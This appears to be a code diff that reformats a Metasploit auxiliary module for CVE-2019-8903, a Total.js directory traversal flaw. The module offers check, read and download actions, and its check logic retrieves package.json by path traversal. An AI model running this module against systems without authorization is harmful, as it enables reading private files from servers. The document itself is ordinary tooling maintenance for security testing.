@@ -8,37 +8,43 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Total.js prior to 3.2.4 Directory Traversal',
-      'Description' => %q(
-        This module check and exploits a directory traversal vulnerability in Total.js prior to 3.2.4.
+    super(
+      update_info(
+        info,
+        'Name' => 'Total.js prior to 3.2.4 Directory Traversal',
+        'Description' => %q{
+          This module check and exploits a directory traversal vulnerability in Total.js prior to 3.2.4.
 
-        Here is a list of accepted extensions: flac, jpg, jpeg, png, gif, ico, js, css, txt, xml,
-        woff, woff2, otf, ttf, eot, svg, zip, rar, pdf, docx, xlsx, doc, xls, html, htm, appcache,
-        manifest, map, ogv, ogg, mp4, mp3, webp, webm, swf, package, json, md, m4v, jsx, heif, heic
-      ),
-      'Author' =>
-        [
+          Here is a list of accepted extensions: flac, jpg, jpeg, png, gif, ico, js, css, txt, xml,
+          woff, woff2, otf, ttf, eot, svg, zip, rar, pdf, docx, xlsx, doc, xls, html, htm, appcache,
+          manifest, map, ogv, ogg, mp4, mp3, webp, webm, swf, package, json, md, m4v, jsx, heif, heic
+        },
+        'Author' => [
           'Riccardo Krauter', # Discovery
-          'Fabio Cogno'       # Metasploit module
+          'Fabio Cogno' # Metasploit module
         ],
-      'License' => MSF_LICENSE,
-      'References' =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2019-8903'],
           ['CWE', '22'],
           ['URL', 'https://blog.totaljs.com/blogs/news/20190213-a-critical-security-fix/'],
           ['URL', 'https://security.snyk.io/vuln/SNYK-JS-TOTALJS-173710']
         ],
-      'Privileged' => false,
-      'DisclosureDate' => '2019-02-18',
-      'Actions' =>
-        [
+        'Privileged' => false,
+        'DisclosureDate' => '2019-02-18',
+        'Actions' => [
           ['CHECK', { 'Description' => 'Check if the target is vulnerable' }],
           ['READ', { 'Description' => 'Attempt to print file content' }],
           ['DOWNLOAD', { 'Description' => 'Attempt to download a file' }]
         ],
-      'DefaultAction' => 'CHECK'))
+        'DefaultAction' => 'CHECK',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -74,21 +80,21 @@ class MetasploitModule < Msf::Auxiliary
     if res && res.code == 200
       json = res.get_json_document
       if json.empty? || !json['dependencies']['total.js']
-        return Exploit::CheckCode::Safe
+        return Exploit::CheckCode::Safe('Total.js dependency not found in package.json')
       else
         print_status("Total.js version is: #{json['dependencies']['total.js']}")
         print_status("App name: #{json['name']}")
         print_status("App description: #{json['description']}")
         print_status("App version: #{json['version']}")
-        return Exploit::CheckCode::Vulnerable
+        return Exploit::CheckCode::Vulnerable('Successfully retrieved package.json via path traversal')
       end
     elsif res && res.headers['X-Powered-By'].to_s.downcase.include?('total.js')
       print_status('Target appear to be vulnerable!')
       print_status("X-Powered-By: #{res.headers['X-Powered-By']}")
-      return Exploit::CheckCode::Detected
+      return Exploit::CheckCode::Detected('Total.js detected via X-Powered-By header')
     else
       vprint_warning('No response')
-      return Exploit::CheckCode::Unknown
+      return Exploit::CheckCode::Unknown('No response received from target')
     end
   end
 
